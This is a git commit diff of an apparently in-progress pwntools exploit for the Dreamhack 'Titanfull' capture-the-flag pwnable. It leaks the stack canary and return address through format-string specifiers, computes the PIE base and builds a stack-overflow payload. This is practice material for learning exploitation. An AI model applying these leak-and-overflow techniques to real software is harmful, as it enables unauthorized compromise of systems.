d167f599e7855b847ef9586daeaa3020d23f6887
Brian Lee <hibrian827@gmail.com>
2025-03-17 22:09:52 +0900

    solving titanfull

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -5,15 +5,19 @@ rem = process("./Pwnable/Titanfull/problem/titanfull")
 
 elf = ELF("./Pwnable/Titanfull/problem/titanfull")
 
-main_addr = elf.symbols['main']
+main_offset = elf.symbols['main']
 bss_addr = elf.bss()
 
-rem.sendlineafter(b"> ", b"%17$p")
+rem.sendlineafter(b"> ", b"%17$p\n%18$p\n%19$p")
 rem.recvuntil(b"0x")
 canary = int(rem.recvn(16), 16)
+print(hex(canary))
+rbp = int(rem.recvn(12), 16)
+rem.recvuntil(b"0x")
+main_addr = int(rem.recvn(12), 16) - 28
+pie_base = main_addr - main_offset
 
 rem.sendlineafter(b"> ", b"7274")
-payload = b"A" * 0x18 + p64(canary) + b"A" * 8 + p64(main_addr)[0:1]
-rem.sendafter(b": ", payload)
+payload = b"A" * 0x18 + p64(canary) + b"A" * 8
+rem.sendlineafter(b": ", payload)
 
-rem.interactive()
